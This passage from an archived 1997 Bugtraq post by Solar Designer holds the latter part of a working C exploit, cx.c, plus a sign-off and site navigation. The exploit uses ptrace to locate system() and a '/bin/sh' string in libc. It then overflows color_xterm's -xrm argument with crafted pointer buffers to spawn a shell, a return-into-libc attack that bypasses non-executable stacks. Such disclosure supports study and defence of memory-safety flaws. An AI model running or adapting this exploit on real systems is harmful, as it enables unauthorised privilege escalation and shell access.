/* Wait until the child tells us the next library call will be system() */
  while (!started);

  if (ptrace(PTRACE_ATTACH, pid, 0, 0)) error("PTRACE_ATTACH");

/* Single step the child until it gets out of system() */
  do {
    waitpid(pid, NULL, WUNTRACED);
    pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
    if (pc == -1) error("PTRACE_PEEKUSR");
    if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error("PTRACE_SINGLESTEP");
  } while ((pc &amp; ADDR_MASK) != ((int)main &amp; ADDR_MASK));

/* Single step the child until it calls system() again */
  do {
    waitpid(pid, NULL, WUNTRACED);
    pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
    if (pc == -1) error("PTRACE_PEEKUSR");
    if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error("PTRACE_SINGLESTEP");
  } while ((pc &amp; ADDR_MASK) == ((int)main &amp; ADDR_MASK));

/* Kill the child, we don't need it any more */
  if (ptrace(PTRACE_KILL, pid, 0, 0)) error("PTRACE_KILL");
  pid = 0;

  printf("system() found at: %08x\n", pc);

/* Let's hope there's an extra NOP if system() is 256 byte aligned */
  if (!(pc &amp; 0xFF))
  if (*(unsigned char *)--pc != 0x90) pc = 0;

/* There's no easy workaround for these (except for using another function) */
  if (!(pc &amp; 0xFF00) || !(pc &amp; 0xFF0000) || !(pc &amp; 0xFF000000)) {
    puts("Zero bytes in address, bad luck");
    exit(1);
  }

/*
 * Search for a "/bin/sh" in libc until we find a copy with no zero bytes
 * in its address. To avoid specifying the actual address that libc is
 * mmap()ed to we search from the address of system() in both directions
 * until a SIGSEGV is generated.
 */
  if (setjmp(env)) step = 1; else step = -1;
  shell = pc;
  signal(SIGSEGV, fault);
  do
    while (memcmp((void *)shell, "/bin/sh", 8)) shell += step;
  while (!(shell &amp; 0xFF) || !(shell &amp; 0xFF00) || !(shell &amp; 0xFF0000));
  signal(SIGSEGV, SIG_DFL);

  printf("\"/bin/sh\" found at: %08x\n", shell);

/* buf1 (which we overflow with) is filled with pointers to buf2 */
  memset(buf1, 'x', ALIGNMENT1);
  ptr = (int *)(buf1 + ALIGNMENT1);
  while ((char *)ptr &lt; buf1 + SIZE1 - sizeof(int))
    *ptr++ = nz(sp - OFFSET);           /* db */
  buf1[SIZE1 - 1] = 0;

/* buf2 is filled with pointers to "/bin/sh" and to buf3 */
  memset(buf2, 'x', SIZE2 + SIZE3);
  ptr = (int *)(buf2 + ALIGNMENT2);
  while ((char *)ptr &lt; buf2 + SIZE2) {
    *ptr++ = shell;                     /* db-&gt;mbstate */
    *ptr++ = nz(sp - OFFSET + SIZE2);   /* db-&gt;methods */
  }

/* buf3 is filled with pointers to system() */
  ptr = (int *)(buf3 + ALIGNMENT3);
  while ((char *)ptr &lt; buf3 + SIZE3 - sizeof(int))
    *ptr++ = pc;                        /* db-&gt;methods-&gt;mbfinish */
  buf3[SIZE3 - 1] = 0;

/* Put buf2 and buf3 on the stack */
  setenv("BUFFER", buf2, 1);

/* GetDatabase() in libX11 will do (*db-&gt;methods-&gt;mbfinish)(db-&gt;mbstate) */
  execl("/usr/X11/bin/color_xterm", "color_xterm", "-xrm", buf1, NULL);
  error("execl");
}

</pre><blockquote style="border-left: #5555EE solid 0.2em; margin: 0em; padding-left: 0.85em"><pre style="margin: 0em;">-- cx.c --&lt;
</pre></blockquote><pre style="margin: 0em;">
That's all for now.
I hope I managed to prove that exploiting buffer overflows should be an art.

Signed,
Solar Designer


</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<p>
<a href="http://seclists.org/bugtraq/1997/Aug/67"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/left-icon-16x16.png" border="0" height="16" width="16"></a>&nbsp;&nbsp;<a href="http://seclists.org/bugtraq/1997/Aug/date.html#63">By Date</a>&nbsp;&nbsp;<a href="http://seclists.org/bugtraq/1997/Aug/68"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/right-icon-16x16.png" border="0" height="16" width="16"></a>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a href="http://seclists.org/bugtraq/1997/Aug/71"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/left-icon-16x16.png" border="0" height="16" width="16"></a>&nbsp;&nbsp;<a href="http://seclists.org/bugtraq/1997/Aug/index.html#63">By Thread</a>&nbsp;&nbsp;<a href="http://seclists.org/bugtraq/1997/Aug/55"><img src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/right-icon-16x16.png" border="0" height="16" width="16"></a>
</p>
<font size="+1"><b>Current thread:</b></font>
<ul style="margin-top: 0em">
<li><a name="54" href="http://seclists.org/bugtraq/1997/Aug/54">popper and qpopper let you read email from other pop clients</a> <em>dynamo () IME NET (Aug 08)</em>
<ul>
<li><a name="62" href="http://seclists.org/bugtraq/1997/Aug/62">Re: popper and qpopper let you read email from other pop clients</a> <em>Ian R. Justman (Aug 08)</em>
<ul>
<li><a name="72" href="http://seclists.org/bugtraq/1997/Aug/72">solaris ^[[1J reboot</a> <em>Tobias Oetiker (Aug 11)</em>
<ul>
<li><a name="74" href="http://seclists.org/bugtraq/1997/Aug/74">Re: solaris ^[[1J reboot</a> <em>Scott Moseman (Aug 12)</em>
</li>
</ul>
</li>
<li><a name="70" href="http://seclists.org/bugtraq/1997/Aug/70">Re: popper and qpopper let you read email from other pop clients</a> <em>Marc Slemko (Aug 11)</em>
</li>
<li><a name="73" href="http://seclists.org/bugtraq/1997/Aug/73">dgux in.fingerd vulnerability</a> <em>George Imburgia (Aug 11)</em>
</li>
<li><a name="71" href="http://seclists.org/bugtraq/1997/Aug/71">procfs patch (fwd)</a> <em>Alex (Aug 11)</em>
</li>
</ul>
</li>
<li><strong>Getting around non-executable stack (and fix)</strong> <em>Solar Designer (Aug 10)</em>
</li>
</ul>
</li>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</td></tr>
</tbody></table>
</td></tr>
<tr><td></td><td align="center">
<font color="#FFFFFF">
[ <a href="http://nmap.org/"><font color="#FFFFFF">Nmap</font></a> |
  <a href="http://sectools.org/"><font color="#FFFFFF">Sec Tools</font></a> |
  <a href="http://seclists.org/"><font color="#FFFFFF">Mailing Lists</font></a> |
  <a href="http://insecure.org/"><font color="#FFFFFF">Site News</font></a> |
  <a href="http://insecure.org/fyodor/"><font color="#FFFFFF">About/Contact</font></a> |
  <a href="http://insecure.org/advertising.html"><font color="#FFFFFF">Advertising</font></a> |
  <a href="http://insecure.org/privacy.html"><font color="#FFFFFF">Privacy</font></a> ]<br>
</font>

<!-- SiteSearch Google -->
<div id="___gcse_0"><div dir="ltr" class="gsc-control-searchbox-only gsc-control-searchbox-only-en"><form accept-charset="utf-8" class="gsc-search-box"><table class="gsc-search-box" cellpadding="0" cellspacing="0"><tbody><tr><td class="gsc-input"><input style="outline: medium none; background: url(&quot;http://www.google.com/cse/intl/en/images/google_custom_search_watermark.gif&quot;) no-repeat scroll left center rgb(255, 255, 255);" spellcheck="false" dir="ltr" id="gsc-i-id1" title="search" name="search" class=" gsc-input" size="10" autocomplete="off" type="text"><input id="bgresponse" name="bgresponse" type="hidden"></td><td class="gsc-search-button"><input title="search" class="gsc-search-button" value="Search" type="button"></td><td class="gsc-clear-button"><div title="clear results" class="gsc-clear-button">&nbsp;</div></td></tr></tbody></table><table class="gsc-branding" cellpadding="0" cellspacing="0"><tbody><tr><td class="gsc-branding-user-defined"></td><td class="gsc-branding-text"><div class="gsc-branding-text">powered by</div></td><td class="gsc-branding-img"><img class="gsc-branding-img" src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/small-logo.png"></td></tr></tbody></table></form></div></div>
<!-- End SiteSearch Google -->

<!-- Bottom Banner -->
<script type="text/javascript"><!--
google_ad_client = "pub-0078565546631069";
/* PageBottom728x90 */
google_ad_slot = "2743510915";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"><!--
if (document.location.protocol != "https:") {
document.write("<script type='text/javascript' src='http://pagead2.googlesyndication.com/pagead/show_ads.js'><\/script>");
}
//-->
</script><script type="text/javascript" src="Bugtraq_%20Getting%20around%20non-executable%20stack%20%28and%20fix%29_files/show_ads.js"></script><ins style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><ins id="aswift_0_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><iframe marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;" frameborder="0" height="90" width="728"></iframe></ins></ins>
<!-- End Bottom Banner -->

</td></tr>
</tbody></table>




<table class="gstl_50 gssb_c" style="width: 846px; display: none; top: 6632px; left: 138px; position: absolute;" cellpadding="0" cellspacing="0"><tbody><tr><td class="gssb_f"></td><td style="width: 100%;" class="gssb_e"></td></tr></tbody></table></body></html>